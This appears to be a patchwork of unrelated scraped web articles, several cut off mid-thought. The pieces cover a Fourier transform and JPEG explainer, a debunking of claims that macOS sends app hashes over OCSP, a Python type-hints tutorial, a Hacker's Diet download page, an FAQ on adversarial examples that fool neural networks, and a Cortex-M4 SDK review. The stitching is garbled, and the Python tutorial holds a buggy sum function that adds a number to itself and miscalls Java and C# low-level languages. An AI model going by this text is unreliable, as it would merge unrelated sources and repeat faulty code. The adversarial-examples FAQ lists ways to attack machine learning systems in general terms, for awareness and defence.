<p>So in this case, we can use Fourier transforms to get an understanding of the fundamental properties of a wave, and then we can use that for things like compression.</p>
<p>Ok, now let's dig more into the Fourier transform. This next part looks cool, but also gives you a bit more understanding of what the Fourier transform does. But mostly looks cool.</p>
<h2 id="epicycles">Epicycles</h2>
<p>Now at the start, I said it splits things into sine waves. The thing is, the sine waves it creates are not just regular sine waves, but they’re 3D. You could call them "complex sinusoids". Or just "spirals".</p>
<canvas id="complex-sinusoid" width="500" height="500"></canvas>
<p>If we take a look from the side, they look like sine waves. From front on, though, these look like circles.</p>
<canvas id="complex-sinusoid-turn" width="500" height="500"></canvas>
<p>So far everything we’ve been doing has only required the regular 2D sine waves. When we do a Fourier transform on 2D waves, the complex parts cancel out so we just end up with sine waves.</p>
<p>But we can use the 3D sine waves to make something fun looking like this:</p>
<canvas id="peace-epicycles" width="500" height="500"></canvas>
<p>What’s going on here?</p>
<p>Well, we can think of the drawing as a 3D shape because of the way it moves around in time. If you imagine the hand being drawn by a person, the three dimensions represent where the tip of their pencil is at that moment. The x and y dimensions tell us the position, and then the time dimension is the time at that moment.</p>
<canvas id="peace-3d" width="500" height="500"></canvas>
<p>Now that we have a 3D pattern, we can't use the regular 2D sine waves to represent it. No matter how many of the 2D sine waves we add up, we'll never get something 3D. So we need something else.</p>
<p>What we can use is the 3D spiral sine waves from before. If we add up lots of those, we can get something that looks like our 3D pattern.</p>
<p>Remember, these waves look like circles when we look at them from front on. The name for the pattern of a circle moving around another circle is an epicycle.</p>
<canvas id="peace-build-up" width="500" height="500"></canvas>

<p><em>Use the slider above to control how many circles there are.</em></p>
<p>Like before, we get a pretty good approximation of our pattern with just a few circles. Because this is a fairly simple shape, all the last ones do is make the edges a little sharper.</p>
<p>All this applies to any drawing, really! Now it’s your chance to play around with it.</p>


<p><em>Use the slider to control how many circles are used for your drawing</em></p>
<p>Again, you'll see for most shapes, we can approximate them fairly well with just a small number of circles, instead of saving all the points.</p>
<p>Can we use this for real data? Well, we could! In reality we have another data format called SVG, which probably does a better job for the types of shapes we tend to create. So for the moment, this is really just for making cool little gifs.</p>
<canvas id="fourier-title" width="500" height="300"></canvas>
<p>There is another type of visual data that does use Fourier transforms, however.</p>
<h2 id="jpegs">JPEGs</h2>
<p>Did you know Fourier transforms can also be used on images? In fact, we use it all the time, because that's how JPEGs work! We're applying the same principles to images – splitting up something into a bunch of sine waves, and then only storing the important ones.</p>
<p>Now we're dealing with images, we need a different type of sine wave. We need to have something that no matter what image we have, we can add up a bunch of these sine waves to get back to our original image.</p>
<p>To do that, each of our sine waves will be images too. Instead of a wave that's a line, we now have images with black and white sections. To represent the size of a wave, each image will have more or less contrast.</p>
<p>We can also use these to represent color in the same way, but let's start with black-and-white images for now. To represent colorless images, we need some horizontal wave images,</p>
<p><img id="img-y-component" src="http://www.jezzamon.com/fourier/img/components-4-0.png"></p>
<p>Along with some vertical wave images.</p>
<p><img id="img-x-component" src="http://www.jezzamon.com/fourier/img/components-0-4.png"></p>
<p>By themselves, just horizontal and vertical images aren't enough to represent the types of images we get. We also need some extra ones that you get by multiplying the two together.</p>

<p>For an 8x8 image, here are all the images we need.</p>

<p>If we take the images, adjust their contrast to the right amount, and then add them up we can create any image.</p>
<p>Let's start with this letter 'A'. It's pretty small, but we need it to be small otherwise we'll end up with too many other images.</p>
<p><img src="http://www.jezzamon.com/fourier/img/a.png"></p>
<p>As we add more and more of these images, we end up with something that becomes closer and closer to the actual image. But I think you'll see the pattern here, as we get a reasonable approximation with just a few of them.</p>

<p>For actual JPEG images there are just a few extra details.</p>
<p>The image gets broken up into 8x8 chunks, and each chunk gets split up separately. We use a set of frequencies to determine how light or dark each pixel is, and then another two sets for the color, one for red-green, and another for blue-yellow. The number of frequencies that we use for each chunk determines the quality of the JPEG.</p>
<p>Here's a real JPEG image, zoomed in so we can see the details. When we play with the quality levels we can see this process happen.</p>

<h2 id="conclusion">Conclusion</h2>
<p>So let's recap:</p>
<ul>
<li>Fourier transforms are things that let us take something and split it up into its frequencies.</li>
<li>The frequencies tell us about some fundamental properties of the data we have</li>
<li>And can compress data by only storing the important frequencies</li>
<li>And we can also use them to make cool looking animations with a bunch of circles</li>
</ul>
<p>This is just scratching the surface into some applications. The Fourier transform is an extremely powerful tool, because splitting things up into frequencies is so fundamental. They're used in a lot of fields, …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Apple’s launch of macOS Big Sur was almost immediately followed by server issues which prevented users from running third-party apps on their computers. While a workaround was soon found by people on Twitter, others raised some privacy concerns related to that issue.</p>
<center><blockquote><div lang="en" dir="ltr"><p>Hey Apple users:</p><p>If you're now experiencing hangs launching apps on the Mac, I figured out the problem using Little Snitch.</p><p>It's trustd connecting to <a href="https://t.co/FzIGwbGRan">https://t.co/FzIGwbGRan</a></p><p>Denying that connection fixes it, because OCSP is a soft failure.</p><p>(Disconnect internet also fixes.) <a href="https://t.co/w9YciFltrb">pic.twitter.com/w9YciFltrb</a></p></div>— Jeff Johnson (@lapcatsoftware) <a href="https://twitter.com/lapcatsoftware/status/1326990296412991489?ref_src=twsrc%5Etfw">November 12, 2020</a></blockquote></center> 
<h2 id="what-is-ocsp">What is OCSP?</h2>
<p>OCSP stands for Online Certificate Status Protocol<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. As the name implies, it is used to verify the validity of a certificate without having to download and scan large certificate revocation lists. macOS uses OCSP to make sure that the developer certificate <strong>hasn’t been revoked</strong> before an app is launched.</p>
<p>As Jeff Johnson explains in his tweet above, if macOS cannot reach Apple’s OCSP responder it skips the check and launches the app anyway - it is basically a fail-open behaviour. The problem is that Apple’s responder didn’t go down; it was reachable but became extremely slow, and this prevented the soft failure from triggering and giving up the check.</p>
<p>It is clear that this mechanism requires macOS to <strong>contact Apple</strong> before an app is launched. The sudden public awareness of this fact, brought about by Apple’s issues, raised some privacy concerns and a post from security researcher <strong>Jeffrey Paul</strong><sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> became very popular on Twitter. He claims that</p>
<blockquote>
<p>In the current version of the macOS, the OS sends to Apple a hash (unique identifier) of each and every program you run, when you run it.</p>
</blockquote>
<p>That would be creepy indeed.</p>
<p>To make things worse, it is common for OCSP to use HTTP - I’m talking about <em>good old <strong>plaintext HTTP</strong> on port 80, none of that HTTPS rubbish</em>. There is usually a good reason for this, that becomes especially clear when the OCSP service is used for web browsers: preventing loops. If you used HTTPS for checking a certificate with OCSP then you would need to also check the certificate for the HTTPS connection using OCSP. That would imply opening another HTTPS connection and so on.</p>
<p>Of course while OCSP does not mandate encryption, it does require that responses are signed by the server. This still doesn’t solve the initial concern that anyone with a traffic analyzer on your network could eavesdrop every app you open and when you open it.</p>
<h2 id="diving-deeper">Diving deeper</h2>
<p>Knowing some OCSP basics, more questions arise. OCSP is about checking certificates; why should this have anything to do with sending out <em><strong>hashes</strong></em> of apps you run? Does macOS really compute the hash of each executable at each launch? What about very large ones? That would take a significant amount of time; is it possible that nobody noticed? Maybe the hash is computed only once (e.g. the first time you run the app) and it is stored somewhere. But I’m not convinced and I think these claims needs more research.</p>
<p>Capturing a OCSP request is as easy as setting up an HTTP proxy or starting Wireshark. No HTTPS means no encryption, no certificate pinning, no problems whatsoever. I captured the following request while opening Firefox.</p>
<div><pre><code data-lang="http"><span>GET</span> <span>/ocsp-devid01/ME4wTKADAgEAMEUwQzBBMAkGBSsOAwIaBQAEFDOB0e%2FbaLCFIU0u76%2BMSmlkPCpsBBRXF%2B2iz9x8mKEQ4Py%2Bhy0s8uMXVAIIBseUIWx6qTA%3D</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>ocsp.apple.com</span>
<span>Accept</span><span>:</span> <span>*/*</span>
<span>User-Agent</span><span>:</span> <span>com.apple.trustd/2.0</span>
<span>Accept-Language</span><span>:</span> <span>it-it</span>
<span>Accept-Encoding</span><span>:</span> <span>gzip, deflate</span>
<span>Connection</span><span>:</span> <span>keep-alive</span>
</code></pre></div><p>I should also add that after closing Firefox and opening it again, no requests were made. This is reasonable, and indicates that certificate checking isn’t performed at each launch but only after it hasn’t been performed for a certain period of time.</p>
<p>The request is a very simple GET that contains the payload as a base64-encoded string. The actual binary data can be easily dumped to a file:</p>
<div><pre><code data-lang="bash"><span>echo</span> <span>'ME4wTKADAgEAMEUwQzBBMAkGBSsOAwIaBQAEFDOB0e/baLCFIU0u76+MSmlkPCpsBBRXF+2iz9x8mKEQ4Py+hy0s8uMXVAIIBseUIWx6qTA='</span> <span>|</span> base64 --decode &gt; output.bin
</code></pre></div><p>We obtain an 80-byte-long payload that looks nothing like a hash. Sure enough, it isn’t. We can use OpenSSL to extract readable information from the binary file.</p>
<div><pre><code data-lang="bash">openssl ocsp -text -reqin output.bin
</code></pre></div><pre><code>OCSP Request Data:
    Version: 1 (0x0)
    Requestor List:
        Certificate ID:
          Hash Algorithm: sha1
          Issuer Name Hash: 3381D1EFDB68B085214D2EEFAF8C4A69643C2A6C
          Issuer Key Hash: 5717EDA2CFDC7C98A110E0FCBE872D2CF2E31754
          Serial Number: 06C794216C7AA930
</code></pre><p>It is clear that the <code>trustd</code> service on macOS doesn’t send out a hash of the apps you launch. Instead, it just sends information about some certificate - as we would certainly expect after understanding what OCSP is in the first place.</p>
<p>Well, this does not solve the problem, does it? If each app has a unique certificate, then it would still be possible to create a table that associates each serial number to the corresponding app, and thus this would still be a privacy concern. Let’s check if this is the case.</p>
<h2 id="developer-certificates">Developer certificates…</h2>
<p>First of all I would like to determine from which certificate this information comes from. I used Apple’s <code>codesign</code> utility to extract certificates from the Firefox app in order to look for matching data.</p>
<div><pre><code data-lang="bash">codesign -d --extract-certificates /Applications/Firefox.app
</code></pre></div><p>This command results in several files being created with names <code>codesign0</code>, <code>codesign1</code>, etc. The first one is the leaf certificate, while others belong to the certificate chain up until the root. <code>codesign0</code> should be what we are looking for, and once again we can use OpenSSL to extract some info about it.</p>
<div><pre><code data-lang="bash">openssl x509 -inform der -in codesign0 -text
</code></pre></div><pre><code>Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 488521955867797808 (0x6c794216c7aa930)

        ...
</code></pre><p>Check the serial number we got (<code>0x6c794216c7aa930</code>) and compare it with the payload of the OCSP request. We have a match! This proves that OCSP requests actually send out information about the app developer certificate.</p>
<h2 id="and-their-generality">…and their generality</h2>
<p>“So what?” you might ask. Well, developer certificates aren’t unique for each app. Once again, don’t take my word for it. We can quickly verify this by checking the certificate of a different app from Mozilla, say Thunderbird.</p>
<div><pre><code data-lang="bash">codesign -d --extract-certificates /Applications/Thunderbird.app
openssl x509 -inform der -in codesign0 -text

</code></pre><p>That’s exactly the same certificate used for Firefox (of course it is!). So Jeffrey Paul’s analysis isn’t quite accurate - at least for what concerns these parts (emphasis mine).</p>
<blockquote>
<p>The OS sends to Apple a hash (unique identifier) of each and every program you run, when you run it.</p>
</blockquote>
<blockquote>
<p>[An IP address]&nbsp;allows for a table that has the following headings:
Date, Time, Computer, ISP, City, State, <strong>Application Hash</strong></p>
</blockquote>
<blockquote>
<p>[This means that Apple knows] what apps you open there, and how often. They know when you open Premiere over at a friend’s house on their Wi-Fi, and they know when you open Tor Browser in a hotel on a trip to another city.</p>
</blockquote>
<p>macOS does actually send out some opaque information about <strong>the developer</strong> certificate of those apps, and that’s quite an important difference on a privacy perspective.</p>
<h2 id="a-word-about-notarization">A word about notarization</h2>
<p>I would like to clarify something that is probably at the root of this misunderstanding. In fact, there exists a situation where macOS can actually send Apple the hash of an executable, and that is when <strong>Gatekeeper</strong> checks if a notarization ticket exists on Apple’s servers upon first launch, in case the ticket isn’t stapled to the app<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>.</p>
<p>This has nothing to do with OCSP. It happens under specific circumstances and the check is performed via a secure (HTTPS) endpoint located at <code>api.apple-cloudkit.com</code>. During this process, a pop-up with a progress bar is shown to the user.</p>
<h2 id="about-blocking-ocsp">About blocking OCSP</h2>
<p>As you probably have already learned during Apple’s OCSP responder outage, you can block OCSP requests in several ways, the most popular ones being Little Snitch<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> and editing your <code>/etc/hosts</code> file. Personally, I wouldn’t suggest doing that as it prevents an <strong>important security feature</strong> from working.</p>
<p>Now that you know the actual facts, if you think your privacy is put at risk by this feature more than having potential undetected malware running on your system, go ahead. Otherwise, don’t bother.</p>
<p>If you use macOS Big Sur, blocking OCSP might not be as trivial. Before crying conspiracy, however, keep in mind that common users are generally not able to fully understand and evaluate the impact of disabling such a complex and delicate security feature on their computer.</p>
<h2 id="tldr">TL;DR</h2>
<ul>
<li>No, macOS <strong>does not</strong> send Apple a hash of your apps each time you run them.</li>
<li>You should be aware that macOS <strong>might transmit</strong> some opaque information about the developer certificate of the apps you run. This information is sent out in clear text on your network.</li>
<li><strong>You shouldn’t</strong> probably block <code>ocsp.apple.com</code> with Little Snitch or in your hosts file.</li>

So when people are visiting or linking to domains owned by a specific person or company, they expect to link to a specific author's work.

I want to get rid of it, but nothing's stopping someone from buying it and serving ads or malicious content. Even after two years, people still use it; linked from other websites and their bookmarks. Even with a redirect page asking them to switch over, those links will never change. There's nothing I can do about it.

November 14, 2020 | https://www.pythonstacks.com/blog/type-hints-python/ | <a href="https://web.archive.org/web/*/https://www.pythonstacks.com/blog/type-hints-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>In the low-level programming languages like Java, C, C++, and C#, <span>variables are strictly typed</span> - which means you have to indicate the variable type when creating a variable.</p>

<p>For example, creating variables in <strong>Java</strong>:</p>

<pre><code>String name = "John";       

int age;                    # only an integer can be assigned to age

age = 23;                   # assigning a value to age</code></pre>



<p>Unlike Java, <span>Python gives us the flexibility to declare and assign variables without specifying their types</span> :</p>

<pre><code>name = "John"

age = 23</code></pre>

<p>In this type of coding, Python <span>automatically figures out the type of data that has been assigned to a variable</span>. You can verify that by using the <code>type()</code> function:</p>

<pre><code>print(type(name))              # &lt;class 'str'&gt;
print(type(age))               # &lt;class 'int'&gt;</code></pre>



<h2>Type Hints in Python</h2>

<p>Though <span>Python is not a strictly typed language</span>, you can still <span>give a hint of a variable's data type</span>.</p>

<p>To specify a variable type when declaring it,</p>

<p><code>variable_name: variable_type = value</code></p>

<pre><code>weather: str = "cloudy"

degrees: int                    # you can declare a variable before assigning
degrees = 32</code></pre>



<p>Also note that even <span>after a variable type is indicated in Python, you can still assign a different data type to the variable</span>:</p>

<pre><code>degrees: int = 32
print(degrees)                      # 32

degrees = "thirty-two"
print(degrees)                      # thirty-two</code></pre>



<p>Specifying a variable type in Python does not mean the variable can only accept values of that type. They are just hints that inform a user of the type which a variable is.</p>



<h2>Adding types to functions</h2>

<p>Type hints are very useful in Functions,&nbsp; mostly when declaring function parameters.</p>

<p>For example, here is a <span>simple function that takes in two arguments and returns the sum</span>.</p>

<pre><code>def sum(a, b):
    return a + b</code></pre>

<p>By looking at this code, <span>one cannot be sure if the caller is going to supply integers</span> as the argument or <span>strings</span> or any other data type.</p>

<p>A call to this function works when supplied with <span>int</span> values and with other values such as <span>strings, lists, and tuples</span>:</p>

<pre><code>sum(3, 5)                               # 8

sum([1, 0, 5], ['java', 'c++'])         # [1, 0, 5, 'java', 'c++']

sum('2', '3')                           # 23</code></pre>

<p>Here you can see that the<code> sum()</code> function works well when it is invoked with either <span>int</span> values, <span>string</span> values, or <span>even</span> lists.</p>

<p>But the goal of the <code>sum()</code> function is to<span> add two integers</span>, and not two <span>lists </span>or <span>strings</span>. We can now provide type hints for the parameters in the Function definition indicating the type that we want to allow.</p>

<p>To indicate that we only want to allow <span>int types</span> we can change our function definition to look like:</p>

<pre><code>def sum(a: int, b: int):
    return a + b</code></pre>

<p>This informs the function caller that <span>the arguments required for the sum() function </span>should be<span> integers </span>not otherwise.</p>

<p>Similarly, <span>to indicate only <code>str </code>types are allowed</span>, we'd change our function to specify it as:</p>

<pre><code>def sum(a: str, b: str):
    return a + b</code></pre>



<h2>Specifying A function's return type.</h2>

<p>One could also indicate the return value of a function call :</p>

<pre><code>def sum(number1, number2) -&gt; int :
    return number1 + number1</code></pre>

<p>This informs the caller that the return type of the <code>sum()</code> function should be an integer.</p>

<h3><i>How to lose weight and hair through stress and poor nutrition</i></h3>
<address>
By
<a href="https://www.fourmilab.ch/" target="_top">John Walker</a>
</address>
</center>

<p>

<cite>The Hacker's Diet</cite>, notwithstanding its silly
subtitle, is a serious book about how to lose weight and
permanently maintain whatever weight you desire.  It
treats dieting and weight control from an <em>engineering</em>
and <em>management</em> standpoint, and provides the tools
and an understanding of why they work and how to use
them that permit the reader to gain control of their
own weight.  The book is intended primarily for busy,
successful engineers, programmers, and managers who
have struggled unsuccessfully in the past to lose
weight and avoid re-gaining it.
<a href="#Comptools">Computer-based tools</a>
and experiments in Microsoft Excel or the Palm Computing
Platform are available, as well as an online Web application,
but a computer is not necessary to use
the techniques described in the book; paper and pencil
alternatives are provided.
</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/e4/">Fourth Edition (2005)</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/e4/"><img src="https://www.fourmilab.ch/hackdiet/figures/hdpage4.png" width="256" height="288" alt=""></a>
The Fourth Edition of <cite>The Hacker's Diet</cite> was
released in November 2005.  It is essentially identical in content with the
previous editions, but has been extensively re-formatted to improve
appearance, accessibility, ease of navigation, and standards compliance.
The Fourth Edition strictly complies with the
<a href="http://www.w3.org/TR/xhtml1/" target="Hackdiet_Aux">XHTML&nbsp;1.0</a> (Transitional and Frameset)
and
<a href="http://www.w3.org/TR/CSS21/" target="Hackdiet_Aux">CSS&nbsp;2.1</a>
standards and requires a browser which implements these
standards.  (As of the release of this edition, current versions
of all of the most popular browsers, including Mozilla Firefox,
Opera, and Microsoft Internet Explorer supported these standards
sufficiently to display the book without problems.)  In addition, the
browser and operating system must display Unicode character entities.
JavaScript and DOM/DHTML are used in the navigation bar, but if they're
absent or disabled, everything will still work.  If your browser and/or
system cannot handle this version, the Third Edition (Frames) or the
No-Frame editions, both of which date from 1994, will almost certainly
work.  The content is the same; only the presentation is more rudimentary.
<br clear="right">
</p>

<h2><a name="epub" href="https://www.fourmilab.ch/hackdiet/epub/hackdiet.epub">EPUB Edition (2011)</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/epub/hackdiet.epub"><img src="https://www.fourmilab.ch/hackdiet/figures/hd_ipad_256.png" width="198" height="288" alt=""></a>
The
<a href="http://en.wikipedia.org/wiki/EPUB" target="Hackdiet_Aux">EPUB</a>
edition is in the open document format
compatible with the iBooks application on the Apple iPad, iPhone, and
iPod&nbsp;touch; Sony Reader; Barnes and Noble Nook; and a variety of
other electronic book devices and mobile platforms.  EPUB books may be
opened directly with a Web browser using the
<a href="http://www.epubread.com/en/" target="Hackdiet_Aux">EPUBReader</a>
add-on for Firefox or the
<a href="http://widgets.opera.com/widget/15552/" target="Hackdiet_Aux">eBook
Reader</a>
widget for Opera, although users of desktop and notebook computers
with Internet connectivity will probably prefer the
<a href="https://www.fourmilab.ch/hackdiet/e4/">Web edition</a>,
due to its more flexible navigation options.
</p>

<p>
If your Web browser has an EPUB-compatible plug-in installed, you can
open the book simply by clicking on the
<a href="https://www.fourmilab.ch/hackdiet/epub/hackdiet.epub" target="Hackdiet_Aux"><cite>The
Hacker's Diet</cite> EPUB Edition</a>
link.  Otherwise, use your browser's idiom to download the
abovementioned file to your computer and then transfer it to your
reading device according to the manufacturer's directions.  For the
iPad and iPhone (etc.), just drag the downloaded
<tt>hackdiet.epub</tt> file to iTunes, where you should see it in the
“Books” section.  Then connect your reading device to the
computer and the book should be transferred to it by the Sync
process.  If the book is not installed, make sure that you've enabled
syncing books to that device, and that if you've opted not to sync all
books in your library to the device, that <cite>The Hacker's
Diet</cite> is checked to be copied.  You must also, of course, have
the Apple
<a href="http://en.wikipedia.org/wiki/IBooks" target="Hackdiet_Aux">iBooks</a>
application installed on the device; if it's missing, go to the App
Store and install it—it's free.
</p>

<p>
<cite>The Hacker's Diet</cite> EPUB edition contains no “Digital
Rights Management” constraints: you are free to install it on as
many devices as you wish, transfer it among them (if their hardware
and software so permit), and pass on copies to others.  It should be
compatible with any EPUB reader hardware and software which can open
standards-compliant unrestricted files.

<p>
<a href="https://www.fourmilab.ch/hackdiet/hdpdf.zip"><img src="https://www.fourmilab.ch/hackdiet/www/figures/hdpdf.gif" width="218" height="256" alt="PDF Screen"></a>
If you prefer to read the book off-line, you can
<a href="https://www.fourmilab.ch/hackdiet/hdpdf.zip">download a PDF edition</a> (1.3 Mb, ZIP compressed)
which you
can read with the Adobe Reader utility,
available for most personal computers and Unix workstations,
which may be
<a href="http://get.adobe.com/reader/" target="Hackdiet_Aux">downloaded
free of charge</a> directly from the
<a href="http://www.adobe.com/" target="Hackdiet_Aux">Adobe Systems</a> Web site.
The PDF edition preserves all the formatting of
the original book, and permits point-and-click navigation
among chapters and to follow cross-references in the text.
</p>

<p>
Adobe is one of the most consistently irritating companies
on Earth with which to do business.  I'd like to give you
a nice button for downloading your own copy of Adobe Reader,
but they won't let me use the image without “registering”
and “licensing” it, which I'm certainly not going to do
in order to promote their product and its file format.
<br clear="right">
</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/hdps.zip">PostScript Edition</a></h2>

<p>
<cite>The Hacker's Diet</cite> was originally typeset
using <a href="http://www.tug.org/" target="Hackdiet_Aux">TeX</a> with the
<a href="http://www.latex-project.org/" target="Hackdiet_Aux">LaTeX</a>
macro package.  Camera-ready copy was generated
from PostScript created by the <tt>dvips</tt>
utility.  The PostScript edition is a single monolithic
file, almost 2.7 megabytes, containing the
entire book as originally typeset.  You can read it on-line
with a PostScript viewing program such as
<a href="http://www.cs.wisc.edu/~ghost/">GhostScript</a>
(which is free), or print it on any PostScript-compatible
printer.  <strong>Before sending this
file to a printer, consider that the book is almost
250 pages long!</strong>  This is a <em>big</em> print
job, which will consume lots of paper, toner, and,
potentially, good will of any colleagues with whom
you share the printer.  The PostScript edition may be
downloaded as either a <a href="https://www.fourmilab.ch/hackdiet/hdps.zip">ZIPped archive</a>
or a <a href="https://www.fourmilab.ch/hackdiet/hackdiet.ps.gz"><b>gzip</b> compressed Unix <b>tar</b>
file</a>; both are 702 Kb in length and uncompress to a 2.7
Mb PostScript file.
</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/www/hackdietf.html">Third Edition (1994 Web Edition with Frames)</a></h2>

<p>
If your browser supports frames but isn't up to the demands
of the Fourth Edition, the original 1994 Web edition with
frames remains available.
It allows navigation with
a panel which lets you click chapter titles and go
directly to that chapter.  If, in addition, your browser
supports JavaScript, simply moving the mouse over a
footnote icon, like this one:
<a onmouseover="javascript:footOver(0);" href="https://www.fourmilab.ch/hackdiet/www/f/0.html"><img src="https://www.fourmilab.ch/hackdiet/www/i/foot.gif" width="15" height="15" alt="[Footnote]"></a>
will pop up a window containing the footnote.  Moving the
mouse over other footnotes displays them in the auxiliary window.
Browsers without JavaScript (or users who have disabled
JavaScript in their browsers) may display footnotes in
the main document window by clicking the footnote icon,
then use their browser's “Back” button to return to the
main text.
</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/www/hackdiet.html">No-Frame Web Edition</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/www/hackdiet.html"><img src="https://www.fourmilab.ch/hackdiet/www/figures/any_browser.gif" width="88" height="31" alt="Works with Any Browser"></a>
Users with browsers which do not support frames, or those
who prefer a more linear presentation in a single
window, may access a no-frame edition of <cite>The Hacker's
Diet</cite> with identical content to the frame-based book.
The no-frame edition includes the pop-up footnotes present
in the frame edition, but since few browsers which lack
frames are likely to support JavaScript, you can simply click
on the footnote icon to display it, then use the
“Back” button or keystroke to return to the text containing
the footnote.

        <h4>What is the demo doing?</h4>
        <p>Neural networks achieve superhuman performance in many areas, but they are easily fooled.</p>
        <p>In the demo above, we can force neural networks to predict anything we want. By adding nearly-invisible noise to an image, we turn "1"s into "9"s, "Stop" signs into "120 km/hr" signs, and dogs into hot dogs.</p>
        <p>These noisy images are called <a href="https://en.wikipedia.org/wiki/Adversarial_machine_learning#Specific_Attacks_Types">adversarial examples</a>. They break the integrity of machine learning systems, and the illusion of their superhuman performance.</p>

        <h4>Why does this matter?</h4>
        <p>Our world is becoming increasingly automated, yet these systems have strange failure modes.</p>
        <p>If machine learning systems are not properly defended, attackers could:</p>
        <ul>
          <li>Impersonate others in facial recognition systems</li>
          <li>Force autonomous vehicles to misrecognize street signs &amp; obstacles</li>
          <li>Bypass content moderation and spam filters in social networks</li>
          <li>Inject adversarial bytes into malware to bypass antivirus systems</li>
          <li>Digitally alter numbers on a check in a mobile banking app</li>
          <li>(and more)</li>
        </ul>

        <h4>Is this limited to image classification with neural networks?</h4>
        <p>No. Adversarial examples exist for almost every machine learning task: <a href="https://nicholas.carlini.com/code/audio_adversarial_examples">speech recognition</a>, <a href="https://arxiv.org/pdf/1804.07998.pdf">text classification</a>, <a href="https://dl.acm.org/doi/10.1145/3308558.3313533">fraud detection</a>, <a href="https://www.ericswallace.com/imitation">machine translation</a>, <a href="https://adversarialpolicies.github.io/">reinforcement learning</a>, ....</p>
        <p>Moreover, all machine learning models (not just neural networks) are vulnerable. In fact, simpler models such as logistic regression are <a href="https://arxiv.org/pdf/1412.6572.pdf">even more easily attacked</a>.</p>
        <p>Finally – beyond adversarial examples – there are many more adversarial attack vectors, including data poisoning, model backdooring, data extraction, and model stealing.</p>

        <h4>How do I defend against adversarial examples?</h4>
        <p>There are several proposed defenses, including adversarial training and admission control.</p>
        <p>However, no defense is universal and many have proven ineffective, so work with an expert to quantify your risks and invest in defenses appropriately.</p>
        <p>(What happens if someone can make your system predict anything they want?).</p>

        <h4>Where can I learn more?</h4>

        <p>In 2020, an MCU is much more than a hunk of silicon. Indeed, it comes with a
whole ecosystem including a BSP, integrated third-party libraries, tooling,
field application support,  and more.</p>

<p>As firmware engineers, we are often handed down an MCU selection as a fait
accompli. Cost concerns, peripheral, or pinout requirements often take precedent
over the SDK.</p>

<p>Yet we are allowed to have an opinion. So here for you today is my first post in
a new “comparing MCU SDKs” series.</p>

<!-- excerpt start -->

<p>In this post, I download SDKs for 10 popular Cortex-M4 microcontrollers, and
evaluate how straightforward it is to get a simple example compiling. I include
some step by step instructions to get started, a rating out of 10, and a few
comments.</p>

<!-- excerpt end -->

<p>It goes without saying that this is an opinion based on my own very specific
setup (MacOS, vim). Your mileage may vary!</p>

<h2 id="what-im-looking-for-in-a-chip-sdk">What I’m looking for in a chip SDK</h2>

<p>My ideal chip SDK provides a way to build and flash projects using tools of
my choosing. This seems like a low bar, but few meet it. Here are things chip
SDKs should <strong>not</strong> do.</p>

<h3 id="dont-choose-my-laptop-os-for-me">Don’t choose my laptop OS for me!</h3>

<p>I left Windows behind when I worked at Sun Microsystems, and I have not looked
back. Today, my daily driver is a MacBook Air.  Unfortunately, some chip vendors
require that you use their Windows-based tools to set up and build your projects.
Now that most compilers are cross-platform, there is no excuse for it.</p>

<h3 id="dont-choose-my-ide-for-me">Don’t choose my IDE for me!</h3>

<p>I’ve been using <code>vim</code> since college, and you can take it from my cold, dead
hands. I love <code>vim</code>! I have it configured just so. It’s lightweight, it’s fast,
and modal editing is the way to work (prove me wrong!). So you’ll understand my
dismay at the spate of Eclipse-based IDEs chip vendors want to foist upon me. I
want nothing to do with their boated, Java environments.</p>

<p>Instead of Eclipse-based IDE, I suggest SDKs provide Makefiles. <code>make</code> is the
lowest common denominator build system, and is well supported by many tools.
Bonus points for project files for IAR and Keil, since many of you like those
tools.</p>

<h3 id="do-include-some-examples">Do include some examples</h3>

<p>If a picture is worth a thousand words, then a working code example is worth a
million. Give me one example of each of the main use cases for your MCU. Bonus
points if you give me an example for each peripheral.</p>

<h2 id="ten-popular-chip-sdks-ranked">Ten Popular Chip SDKs, Ranked</h2>

<h3 id="nordic-semi-nrf5-sdk---1010">Nordic Semi nRF5-SDK - 10/10</h3>

<p>Nordic semiconductor’s line of Cortex-M4 MCUs includes the nRF52810, nRF52810,
and nRF52840. All feature a 2.4GHz radio, which may deter you if all you want is
an MCU.</p>

<p>The nRF5-SDK (soon to be replaced by the equally excellent nRF-Connect-SDK), is
in my view the best chip SDK out there.</p>

<h4 id="why-the-rating">Why the rating</h4>

<ul>
  <li>Cross-platform ✅</li>
  <li>Supports armcc/Keil, IAR, and Makefiles ✅</li>
  <li>Lots of bundled examples ✅</li>
  <li>Single zip, no install needed ✅</li>
</ul>

<p>The nRF5 SDK does everything right. No registration, no install, no online
configurator. It even is distributed under a BSD license!</p>

<h4 id="compiling-a-blinky-example">Compiling a Blinky example</h4>
<ol>
  <li>Download the nRF5 SDK from <a href="https://www.nordicsemi.com/Software-and-tools/Software/nRF5-SDK/Download#infotabs" target="_blank">nRF5 SDK downloads - nordicsemi.com</a>
</li>
  <li>Unzip the resulting <code>DeviceDownload.zip</code> file</li>
  <li>Unzip the SDK archive contained within. In my case that’s <code>nRF5SDK1702d674dde.zip</code>
</li>
  <li>
<code>cd</code> to the example you are interested in. Examples are contained within the <code>example</code> folder. In my case, <code>examples/peripheral/blinky/pca10040/blank</code>.</li>
  <li>
<code>cd</code> to the build system folder of your choice, in my case <code>armgcc</code>
</li>
  <li>Build the example, in my case by invoking <code>GNU_INSTALL_ROOT= make</code>
</li>
</ol>

<p>This will generate a <code>bin</code>, <code>elf</code>, and <code>hex</code> file (among others) under <code>_build</code>.</p>

<h3 id="texas-instruments-tivaware---910">Texas Instruments TivaWare - 9/10</h3>

<p>The Tiva C series is the latest entry in Texas Instruments’s line of Cortex-M
microcontrollers.  I do not have a lot of experience with them, but they seem
